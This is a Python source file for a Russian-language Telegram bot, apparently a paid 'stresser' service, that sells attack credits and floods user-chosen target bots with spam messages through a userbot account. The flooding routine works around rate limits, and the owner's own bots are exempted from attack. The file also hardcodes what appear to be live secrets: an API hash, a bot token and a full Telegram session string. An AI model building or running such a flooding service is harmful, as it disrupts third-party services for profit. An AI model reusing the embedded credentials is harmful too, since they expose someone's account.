import asyncio
import logging
import sqlite3
import hashlib
import random
import string
from datetime import datetime, timedelta
from typing import Dict, List, Optional

from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.tl.functions.users import GetFullUserRequest
from telethon.errors import FloodWaitError

# ==================== НАСТРОЙКИ ====================
API_ID = 34000428  # ПОЛУЧИ на my.telegram.org
API_HASH = '68c4db995c26cda0187e723168cc6285'  # ПОЛУЧИ на my.telegram.org
BOT_TOKEN = '8508366803:AAGuooJ4PdmJrwL8AAeWV3sNK4BAMJLegFY'  # ПОЛУЧИ у @BotFather
STRESSER_SESSION_STRING = """1AgAOMTQ5LjE1NC4xNjcuNDEBuxDpjE0VYduD7dvnG+U+Q5vtLX+EtGO7tgAe+CG0ryX1xIuvUA9MbUt7v9anxRwC5vCi5j7oZ6Fs6BDkuhYyfGWwwt8sC8kNHkyEXkpv8kgZjMMoXnV1hV+Otnk0zE5YSUxHBeQDZekUfQtr9deCW5NI6XiLIyadCzltoLOFM5BKd+MggXARh4Hafy3Pdv84Rqtu5PYnBSc9JxK0Srd3gsZ3FIXfBavSYmRpXYil1S/bhfcmSAQpFg756fobQTdnPRSnsA/ov0GHHcpjH+pDpdDqlDU9HwJxerhjALksGdAvScIr2GL1+bZMRBqVO9Rj4EIKyn797NVfrFV9pQJIFjw="""  # ТВОЯ StringSession

ADMIN_ID = 5522585352  # Твой Telegram ID
CHANNEL_USERNAME = '@Streeserinfo'  # Канал для подписки
SUPPORT_USERNAME = '@wakeGuarantee'  # Поддержка
REQUEST_PRICE = 0.1  # $ за 1 запрос
REQUEST_DURATION = 15  # секунд за 1 запрос

# ==================== БАЗА ДАННЫХ ====================
class Database:
    def __init__(self, db_name='stresser.db'):
        self.conn = sqlite3.connect(db_name, check_same_thread=False)
        self.cursor = self.conn.cursor()
        self.init_db()
    
    def init_db(self):
        # Пользователи
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                captcha_passed INTEGER DEFAULT 0,
                captcha_answer TEXT,
                subscribed INTEGER DEFAULT 0,
                bio_checked INTEGER DEFAULT 0,
                requests_balance INTEGER DEFAULT 0,
                total_spent REAL DEFAULT 0,
                requests_used INTEGER DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Промокоды
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS promo_codes (
                code TEXT PRIMARY KEY,
                requests INTEGER,
                uses_left INTEGER,
                created_by INTEGER,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Платежи
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS payments (
                payment_id TEXT PRIMARY KEY,
                user_id INTEGER,
                amount_usd REAL,
                status TEXT DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Атаки
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS attacks (
                attack_id TEXT PRIMARY KEY,
                user_id INTEGER,
                target TEXT,
                requests_used INTEGER,
                status TEXT,
                started_at TIMESTAMP,
                finished_at TIMESTAMP
            )
        ''')
        
        self.conn.commit()
    
    def get_user(self, user_id: int):
        self.cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
        row = self.cursor.fetchone()
        if row:
            cols = [desc[0] for desc in self.cursor.description]
            return dict(zip(cols, row))
        return None
    
    def create_user(self, user_id: int, username: str):
        self.cursor.execute(
            'INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)',
            (user_id, username)
        )
        self.conn.commit()
        return self.get_user(user_id)
    
    def update_user(self, user_id: int, **kwargs):
        if not kwargs:
            return
        
        set_clause = ', '.join([f'{k}=?' for k in kwargs.keys()])
        values = list(kwargs.values()) + [user_id]
        self.cursor.execute(f'UPDATE users SET {set_clause} WHERE user_id=?', values)
        self.conn.commit()
    
    def add_requests(self, user_id: int, requests: int):
        self.cursor.execute(
            'UPDATE users SET requests_balance = requests_balance + ? WHERE user_id = ?',
            (requests, user_id)
        )
        self.conn.commit()
        return True
    
    def use_requests(self, user_id: int, requests: int):
        user = self.get_user(user_id)
        if not user or user['requests_balance'] < requests:
            return False
        
        self.cursor.execute(
            '''UPDATE users SET 
               requests_balance = requests_balance - ?,
               requests_used = requests_used + ?
               WHERE user_id = ?''',
            (requests, requests, user_id)
        )
        self.conn.commit()
        return True
    
    def create_payment(self, payment_id: str, user_id: int, amount_usd: float):
        self.cursor.execute(
            'INSERT INTO payments (payment_id, user_id, amount_usd) VALUES (?, ?, ?)',
            (payment_id, user_id, amount_usd)
        )
        self.conn.commit()
        return True
    
    def mark_payment_paid(self, payment_id: str):
        self.cursor.execute(
            'UPDATE payments SET status = "paid" WHERE payment_id = ?',
            (payment_id,)
        )
        
        # Получаем информацию о платеже
        self.cursor.execute(
            'SELECT user_id, amount_usd FROM payments WHERE payment_id = ?',
            (payment_id,)
        )
        row = self.cursor.fetchone()
        if row:
            user_id, amount_usd = row
            requests = int(amount_usd / REQUEST_PRICE)
            self.add_requests(user_id, requests)
            
            # Обновляем общие траты
            self.cursor.execute(
                'UPDATE users SET total_spent = total_spent + ? WHERE user_id = ?',
                (amount_usd, user_id)
            )
            self.conn.commit()
            return True
        return False
    
    def create_attack(self, attack_id: str, user_id: int, target: str, requests_used: int):
        self.cursor.execute(
            '''INSERT INTO attacks 
               (attack_id, user_id, target, requests_used, status, started_at)
               VALUES (?, ?, ?, ?, ?, ?)''',
            (attack_id, user_id, target, requests_used, 'running', datetime.now())
        )
        self.conn.commit()
        return True
    
    def update_attack(self, attack_id: str, status: str):
        self.cursor.execute(
            '''UPDATE attacks SET 
               status = ?, finished_at = ?
               WHERE attack_id = ?''',
            (status, datetime.now(), attack_id)
        )
        self.conn.commit()
        return True
    
    def get_stats(self):
        stats = {}
        
        queries = [
            ('total_users', 'SELECT COUNT(*) FROM users'),
            ('active_users', 'SELECT COUNT(*) FROM users WHERE requests_balance > 0'),
            ('total_requests', 'SELECT SUM(requests_balance) FROM users'),
            ('total_used', 'SELECT SUM(requests_used) FROM users'),
            ('total_income', 'SELECT SUM(amount_usd) FROM payments WHERE status = "paid"'),
            ('total_attacks', 'SELECT COUNT(*) FROM attacks'),
        ]
        
        for key, query in queries:
            self.cursor.execute(query)
            result = self.cursor.fetchone()[0]
            stats[key] = result if result is not None else 0
        
        return stats
    
    def close(self):
        self.conn.close()

# ==================== КАПТЧА ====================
class CaptchaSystem:
    @staticmethod
    def generate():
        a = random.randint(1, 20)
        b = random.randint(1, 20)
        answer = a + b
        question = f"{a} + {b} = ?"
        return question, str(answer)

# ==================== СТРЕССЕР ====================
class BotStresser:
    def __init__(self, client):
        self.client = client
        self.active_attacks = {}
    
    async def stress_bot(self, bot_username: str, requests_count: int):
        try:
            # Защита от атаки на своих ботов
            if any(x in bot_username.lower() for x in ['wake', 'stress', 'stresser']):
                return {'success': False, 'error': 'Нельзя атаковать своих ботов'}
            
            attack_id = f"ATK{random.randint(100000, 999999)}"
            
            self.active_attacks[attack_id] = {
                'target': bot_username,
                'requests': requests_count,
                'started': datetime.now(),
                'sent': 0,
                'status': 'running'
            }
            
            # Запускаем атаку в фоне
            asyncio.create_task(self._execute_attack(attack_id, bot_username, requests_count))
            
            return {
                'success': True,
                'attack_id': attack_id,
                'duration': requests_count * REQUEST_DURATION
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    async def _execute_attack(self, attack_id: str, bot_username: str, requests: int):
        attack = self.active_attacks.get(attack_id)
        if not attack:
            return
        
        try:
            bot = await self.client.get_entity(bot_username)
        except Exception as e:
            attack['status'] = 'failed'
            attack['error'] = str(e)
            return
        
        for i in range(requests):
            if attack['status'] != 'running':
                break
            
            try:
                messages = ['test', 'ping', '/start', 'hello', 'бот']
                await self.client.send_message(bot, random.choice(messages))
                attack['sent'] += 1
                
                # Случайная задержка
                await asyncio.sleep(random.uniform(0.2, 0.8))
                
            except FloodWaitError as e:
                await asyncio.sleep(e.seconds)
            except Exception:
                await asyncio.sleep(1)
        
        attack['status'] = 'completed'
        attack['finished'] = datetime.now()

# ==================== ОСНОВНОЙ БОТ ====================
class WakeStresserBot:
    def __init__(self):
        self.db = Database()
        self.captcha = CaptchaSystem()
        self.bot_client = None
        self.userbot_client = None
        self.stresser = None
    
    async def initialize(self):
        """Инициализация клиентов"""
        # Инициализация бота
        self.bot_client = TelegramClient('bot_session', API_ID, API_HASH)
        await self.bot_client.start(bot_token=BOT_TOKEN)
        
        # Инициализация юзербота
        self.userbot_client = TelegramClient(
            StringSession(STRESSER_SESSION_STRING),
            API_ID,
            API_HASH
        )
        await self.userbot_client.start()
        
        # Инициализация стрессера
        self.stresser = BotStresser(self.userbot_client)
        
        # Регистрация обработчиков
        await self._register_handlers()
        
        logging.info("✅ Бот инициализирован")
        return True
    
    async def _register_handlers(self):
        """Регистрация обработчиков событий"""
        
        # ========== START HANDLER ==========
        @self.bot_client.on(events.NewMessage(pattern='/start'))
        async def start_handler(event):
            user_id = event.sender_id
            username = event.sender.username or ''
            
            # Создаем/получаем пользователя
            user = self.db.get_user(user_id)
            if not user:
                user = self.db.create_user(user_id, username)
            
            # Проверка капчи
            if not user['captcha_passed']:
                question, answer = self.captcha.generate()
                self.db.update_user(user_id, captcha_answer=answer)
                
                await event.respond(
                    f"🔐 **Проверка безопасности**\n\n"
                    f"Решите пример: {question}\n"
                    f"Отправьте ответ числом в чат.",
                    buttons=Button.clear()
                )
                return
            
            # Проверка подписки
            if not user['subscribed']:
                await event.respond(
                    f"📢 **Требуется подписка**\n\n"
                    f"Подпишитесь на канал: {CHANNEL_USERNAME}\n\n"
                    f"После подписки нажмите кнопку:",
                    buttons=[
                        [Button.url("📢 Подписаться", f"https://t.me/{CHANNEL_USERNAME.replace('@', '')}")],
                        [Button.inline("✅ Проверить подписку", b"check_sub")]
                    ]
                )
                return
            
            # Проверка Bio
            if not user['bio_checked']:
                await event.respond(
                    "📝 **Требуется настройка профиля**\n\n"
                    "Добавьте в описание профиля Telegram:\n"
                    "`@WakeStresserBot`\n\n"
                    "После добавления нажмите кнопку:",
                    buttons=[[Button.inline("🔍 Проверить Bio", b"check_bio")]]
                )
                return
            
            # Все проверки пройдены
            await self._show_main_menu(event)
        
        # ========== MESSAGE HANDLER ==========
        @self.bot_client.on(events.NewMessage)
        async def message_handler(event):
            # Пропускаем команды
            if event.message.text and event.message.text.startswith('/'):
                return
            
            user_id = event.sender_id
            text = event.message.text or ""
            
            user = self.db.get_user(user_id)
            if not user:
                return
            
            # Обработка капчи
            if not user['captcha_passed']:
                correct_answer = user.get('captcha_answer', '')
                if text.strip() == correct_answer:
                    self.db.update_user(user_id, captcha_passed=True)
                    await event.respond("✅ Капча пройдена успешно!")
                    
                    await event.respond(
                        f"📢 Теперь подпишитесь на канал: {CHANNEL_USERNAME}",
                        buttons=[
                            [Button.url("📢 Подписаться", f"https://t.me/{CHANNEL_USERNAME.replace('@', '')}")],
                            [Button.inline("✅ Проверить подписку", b"check_sub")]
                        ]
                    )
                else:
                    question, answer = self.captcha.generate()
                    self.db.update_user(user_id, captcha_answer=answer)
                    await event.respond(f"❌ Неверный ответ!\n\nНовый пример: {question}\nОтправьте ответ числом:")
                return
            
            # Обработка команд стресса
            if text.startswith('@') and ' ' in text:
                await self._handle_stress_command(event, text)
            
            # Обработка промокодов
            elif text.upper().startswith('PROMO '):
                await self._handle_promo_command(event, text)
            
            # Обработка админ команд
            elif user_id == ADMIN_ID:
                await self._handle_admin_command(event, text)
        
        # ========== CALLBACK HANDLERS ==========
        @self.bot_client.on(events.CallbackQuery)
        async def callback_handler(event):
            data = event.data.decode()
            
            # Проверка подписки
            if data == 'check_sub':
                subscribed = await self._check_subscription(event.sender_id)
                if subscribed:
                    self.db.update_user(event.sender_id, subscribed=True)
                    await event.edit(
                        "✅ Подписка подтверждена!\n\n"
                        "Теперь добавьте в описание профиля:\n"
                        "`@WakeStresserBot`",
                        buttons=[[Button.inline("🔍 Проверить Bio", b"check_bio")]]
                    )
                else:
                    await event.answer("❌ Вы не подписаны на канал!", alert=True)
            
            # Проверка Bio
            elif data == 'check_bio':
                bio_ok = await self._check_bio(event.sender_id)
                if bio_ok:
                    self.db.update_user(event.sender_id, bio_checked=True)
                    await event.edit("✅ Bio проверено успешно!")
                    await self._show_main_menu(event)
                else:
                    await event.answer("❌ Bio не содержит ссылку на бота!", alert=True)
            
            # Главное меню
            elif data == 'main_menu':
                await self._show_main_menu(event)
            
            # Купить запросы
            elif data == 'buy_requests':
                await self._show_buy_menu(event)
            
            # Выбор количества запросов
            elif data.startswith('buy_'):
                try:
                    requests = int(data.split('_')[1])
                    await self._process_payment(event, requests)
                except:
                    await event.answer("❌ Ошибка!", alert=True)
            
            # Стресс меню
            elif data == 'stress_menu':
                await self._show_stress_menu(event)
            
            # Моя статистика
            elif data == 'my_stats':
                await self._show_stats(event)
            
            # Помощь
            elif data == 'help':
                await event.respond(
                    f"🆘 **Помощь**\n\n"
                    f"По всем вопросам обращайтесь:\n"
                    f"{SUPPORT_USERNAME}",
                    buttons=Button.clear()
                )
            
            # Активация промокода
            elif data == 'activate_promo':
                await event.respond(
                    "🎁 **Активация промокода**\n\n"
                    "Отправьте промокод в чат в формате:\n"
                    "`PROMO ваш_промокод`\n\n"
                    "Пример: `PROMO WELCOME100`"
                )
            
            # Админ панель
            elif data == 'admin_panel' and event.sender_id == ADMIN_ID:
                await self._show_admin_panel(event)
            
            # Подтверждение оплаты
            elif data.startswith('confirm_pay_'):
                payment_id = data.split('_')[2]
                await self._confirm_payment(event, payment_id)
    
    # ========== МЕТОДЫ ОТОБРАЖЕНИЯ МЕНЮ ==========
    async def _show_main_menu(self, event):
        user = self.db.get_user(event.sender_id)
        balance = user['requests_balance'] if user else 0
        
        buttons = [
            [Button.inline("🛒 Купить запросы", b"buy_requests")],
            [Button.inline("⚡ Запустить Stress", b"stress_menu")],
            [Button.inline("🎁 Активировать промокод", b"activate_promo")],
            [Button.inline("📊 Моя статистика", b"my_stats"),
             Button.inline("🆘 Помощь", b"help")]
        ]
        
        # Добавляем админку для администратора
        if event.sender_id == ADMIN_ID:
            buttons.append([Button.inline("👑 Админ панель", b"admin_panel")])
        
        await event.respond(
            f"🔥 **Wake Stresser Bot**\n\n"
            f"📊 Ваш баланс: `{balance}` запросов\n"
            f"💰 1 запрос = ${REQUEST_PRICE}\n"
            f"⏱️ 1 запрос = {REQUEST_DURATION} секунд\n\n"
            f"Выберите действие:",
            buttons=buttons
        )
    
    async def _show_buy_menu(self, event):
        await event.edit(
            "🛒 **Покупка запросов**\n\n"
            f"1 запрос = ${REQUEST_PRICE} = {REQUEST_DURATION} секунд\n\n"
            "Выберите количество запросов:",
            buttons=[
                [Button.inline("🔟 10 запросов ($1)", b"buy_10"),
                 Button.inline("💯 100 запросов ($10)", b"buy_100")],
                [Button.inline("🔥 500 запросов ($50)", b"buy_500"),
                 Button.inline("💥 1000 запросов ($100)", b"buy_1000")],
                [Button.inline("🔙 Назад", b"main_menu")]
            ]
        )
    
    async def _process_payment(self, event, requests):
        user_id = event.sender_id
        amount_usd = requests * REQUEST_PRICE
        
        await event.edit("⏳ Создаю платёжную информацию...")
        
        # Генерируем ID платежа
        payment_id = f"PAY{random.randint(100000, 999999)}"
        
        # Сохраняем в базу
        self.db.create_payment(payment_id, user_id, amount_usd)
        
        # Показываем информацию об оплате
        await event.edit(
            f"💳 **Оплата {requests} запросов**\n\n"
            f"📊 Запросов: {requests}\n"
            f"💰 Сумма: ${amount_usd:.2f}\n"
            f"⏱️ Длительность: {requests * REQUEST_DURATION} сек\n\n"
            f"**Для оплаты:**\n"
            f"1. Свяжитесь с админом: {SUPPORT_USERNAME}\n"
            f"2. Переведите ${amount_usd:.2f}\n"
            f"3. Нажмите кнопку '✅ Я оплатил'\n\n"
            f"🆔 ID платежа: `{payment_id}`",
            buttons=[
                [Button.url("💬 Связаться с админом", f"https://t.me/{SUPPORT_USERNAME.replace('@', '')}")],
                [Button.inline("✅ Я оплатил", f"confirm_pay_{payment_id}")],
                [Button.inline("❌ Отмена", b"buy_requests")]
            ]
        )
    
    async def _confirm_payment(self, event, payment_id):
        # Помечаем платеж как оплаченный
        if self.db.mark_payment_paid(payment_id):
            await event.edit(
                "✅ **Оплата подтверждена!**\n\n"
                "Запросы успешно зачислены на ваш баланс.\n"
                "Теперь можете запускать атаки!",
                buttons=[[Button.inline("⚡ Запустить Stress", b"stress_menu")]]
            )
        else:
            await event.answer("❌ Платёж не найден!", alert=True)
    
    async def _show_stress_menu(self, event):
        user = self.db.get_user(event.sender_id)
        
        if not user or user['requests_balance'] <= 0:
            await event.answer("❌ У вас нет запросов на балансе!", alert=True)
            return
        
        await event.edit(
            f"⚡ **Запуск Stress теста**\n\n"
            f"📊 Доступно запросов: {user['requests_balance']}\n"
            f"⏱️ 1 запрос = {REQUEST_DURATION} секунд\n\n"
            "**Формат команды:**\n"
            "`@username количество_запросов`\n\n"
            "**Пример:**\n"
            "`@testbot 100` - 100 запросов\n\n"
            "**Защита:** Нельзя атаковать ботов с 'wake', 'stress' в имени\n\n"
            "Отправьте команду в чат:",
            buttons=[[Button.inline("🔙 Назад", b"main_menu")]]
        )
    
    async def _show_stats(self, event):
        user = self.db.get_user(event.sender_id)
        if not user:
            return
        
        stats_text = f"📊 **Ваша статистика**\n\n"
        stats_text += f"🆔 ID: `{user['user_id']}`\n"
        stats_text += f"📛 Username: @{user['username'] or 'нет'}\n"
        stats_text += f"💰 Баланс: `{user['requests_balance']}` запросов\n"
        stats_text += f"📤 Использовано: `{user['requests_used']}` запросов\n"
        stats_text += f"💵 Потрачено: `${user['total_spent'] or 0:.2f}`\n"
        stats_text += f"📅 Регистрация: `{user['created_at'][:10] if user['created_at'] else 'нет'}`"
        
        await event.edit(
            stats_text,
            buttons=[[Button.inline("🔙 Назад", b"main_menu")]]
        )
    
    async def _show_admin_panel(self, event):
        if event.sender_id != ADMIN_ID:
            await event.answer("❌ Доступ запрещён!", alert=True)
            return
        
        stats = self.db.get_stats()
        
        await event.edit(
            f"👑 **Панель администратора**\n\n"
            f"👥 Пользователей: {stats['total_users']}\n"
            f"🔥 Активных: {stats['active_users']}\n"
            f"📊 Всего запросов: {stats['total_requests']}\n"
            f"⚡ Использовано: {stats['total_used']}\n"
            f"💰 Доход: ${stats['total_income']:.2f}\n"
            f"🎯 Атак: {stats['total_attacks']}\n\n"
            f"**Команды:**\n"
            f"• GIVE user_id количество - выдать запросы\n"
            f"• PROMO код запросы использования - создать промокод",
            buttons=[[Button.inline("🔙 Назад", b"main_menu")]]
        )
    
    # ========== ОБРАБОТЧИКИ КОМАНД ==========
    async def _handle_stress_command(self, event, text: str):
        user = self.db.get_user(event.sender_id)
        if not user or user['requests_balance'] <= 0:
            return
        
        parts = text.split()
        if len(parts) < 2:
            return
        
        bot_username = parts[0].replace('@', '')
        
        # Защита от дурака
        if any(x in bot_username.lower() for x in ['wake', 'stress', 'stresser']):
            await event.respond(
                "❌ **Защита от дурака**\n\n"
                "К сожалению, отправить запрос на нашего бота невозможно.\n"
                "Мы защищены от самосаботажа!"
            )
            return
        
        try:
            requests = int(parts[1])
            
            if user['requests_balance'] < requests:
                await event.respond(
                    f"❌ Недостаточно запросов!\n"
                    f"Нужно: {requests}, есть: {user['requests_balance']}"
                )
                return
            
            # Запускаем атаку
            result = await self.stresser.stress_bot(bot_username, requests)
            
            if result['success']:
                # Списание баланса
                self.db.use_requests(event.sender_id, requests)
                
                # Сохраняем атаку в БД
                attack_id = result['attack_id']
                self.db.create_attack(attack_id, event.sender_id, bot_username, requests)
                
                await event.respond(
                    f"✅ **Атака запущена!**\n\n"
                    f"🎯 Цель: @{bot_username}\n"
                    f"📊 Запросов: {requests}\n"
                    f"⏱️ Длительность: {requests * REQUEST_DURATION} сек\n"
                    f"🆔 ID: `{attack_id}`\n\n"
                    f"Баланс списан: {requests} запросов"
                )
            else:
                await event.respond(f"❌ Ошибка: {result['error']}")
                
        except ValueError:
            await event.respond("❌ Неверный формат количества запросов!")
        except Exception as e:
            await event.respond(f"❌ Ошибка: {str(e)}")
    
    async def _handle_promo_command(self, event, text: str):
        try:
            code = text.split()[1].upper()
            
            # Стандартные промокоды
            promo_codes = {
                'WELCOME100': 100,
                'TEST50': 50,
                'START200': 200,
                'FREE100': 100
            }
            
            if code in promo_codes:
                requests = promo_codes[code]
                user_id = event.sender_id
                
                # Начисляем запросы
                self.db.add_requests(user_id, requests)
                
                await event.respond(
                    f"🎁 **Промокод активирован!**\n\n"
                    f"Код: `{code}`\n"
                    f"🎁 Получено: {requests} запросов\n"
                    f"📊 Теперь можете запускать атаки!"
                )
            else:
                await event.respond("❌ Промокод недействителен!")
        except:
            await event.respond("❌ Неверный формат промокода!")
    
    async def _handle_admin_command(self, event, text: str):
        # Выдача запросов
        if text.upper().startswith('GIVE '):
            try:
                parts = text.split()
                if len(parts) != 3:
                    await event.respond("❌ Формат: GIVE user_id количество")
                    return
                
                target = parts[1]
                requests = int(parts[2])
                
                # Определяем user_id
                if target.startswith('@'):
                    user_entity = await self.bot_client.get_entity(target)
                    target_id = user_entity.id
                else:
                    target_id = int(target)
                
                # Выдаем запросы
                self.db.add_requests(target_id, requests)
                
                await event.respond(
                    f"✅ Запросы выданы!\n"
                    f"👤 Пользователь: {target_id}\n"
                    f"🎁 Запросов: {requests}"
                )
            except Exception as e:
                await event.respond(f"❌ Ошибка: {str(e)}")
        
        # Создание промокода
        elif text.upper().startswith('PROMO '):
            try:
                parts = text.split()
                if len(parts) != 4:
                    await event.respond("❌ Формат: PROMO код запросы использования")
                    return
                
                code = parts[1].upper()
                requests = int(parts[2])
                uses = int(parts[3])
                
                # Сохраняем промокод
                self.db.cursor.execute(
                    'INSERT INTO promo_codes (code, requests, uses_left, created_by) VALUES (?, ?, ?, ?)',
                    (code, requests, uses, ADMIN_ID)
                )
                self.db.conn.commit()
                
                await event.respond(
                    f"✨ **Промокод создан!**\n\n"
                    f"Код: `{code}`\n"
                    f"🎁 Запросов: {requests}\n"
                    f"🔄 Использований: {uses}\n\n"
                    f"Для активации: `PROMO {code}`"
                )
            except Exception as e:
                await event.respond(f"❌ Ошибка: {str(e)}")
    
    # ========== ВСПОМОГАТЕЛЬНЫЕ МЕТОДЫ ==========
    async def _check_subscription(self, user_id: int):
        try:
            channel = await self.bot_client.get_entity(CHANNEL_USERNAME)
            participants = await self.bot_client.get_participants(channel, limit=100)
            return any(p.id == user_id for p in participants)
        except:
            return False
    
    async def _check_bio(self, user_id: int):
        try:
            user_full = await self.bot_client(GetFullUserRequest(user_id))
            bio = user_full.about or ""
            return '@WakeStresserBot' in bio
        except:
            return False
    
    async def start(self):
        """Запуск бота"""
        # Инициализация
        await self.initialize()
        
        # Приветственное сообщение
        print("\n" + "="*50)
        print("🔥 WAKE STRESSER BOT")
        print("🚀 Успешно запущен!")
        print("="*50)
        print(f"👤 Бот: @{(await self.bot_client.get_me()).username}")
        print(f"👥 Юзербот: @{(await self.userbot_client.get_me()).username}")
        print("="*50 + "\n")
        
        # Уведомление админу
        try:
            await self.bot_client.send_message(
                ADMIN_ID,
                "✅ Бот запущен и готов к работе!\n\n"
                "Основные команды:\n"
                "• /start - главное меню\n"
                "• @бот количество - запустить атаку\n"
                "• PROMO код - активировать промокод"
            )
        except:
            pass
        
        # Запускаем бота
        await self.bot_client.run_until_disconnected()

# ==================== ЗАПУСК ====================
async def main():
    # Проверка настроек
    if not all([API_ID, API_HASH, BOT_TOKEN, STRESSER_SESSION_STRING]):
        print("❌ ОШИБКА: Заполни все настройки!")
        print("1. API_ID и API_HASH - получи на my.telegram.org")
        print("2. BOT_TOKEN - получи у @BotFather (/newbot)")
        print("3. STRESSER_SESSION_STRING - твоя StringSession")
        return
    
    # Настройка логирования
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    
    # Создание и запуск бота
    bot = WakeStresserBot()
    
    try:
        await bot.start()
    except KeyboardInterrupt:
        print("\n🛑 Бот остановлен пользователем")
    except Exception as e:
        print(f"❌ Критическая ошибка: {e}")
    finally:
        if hasattr(bot, 'db'):
            bot.db.close()

# Точка входа
if __name__ == "__main__":
    print("🚀 Запускаю Wake Stresser Bot...")
    asyncio.run(main())
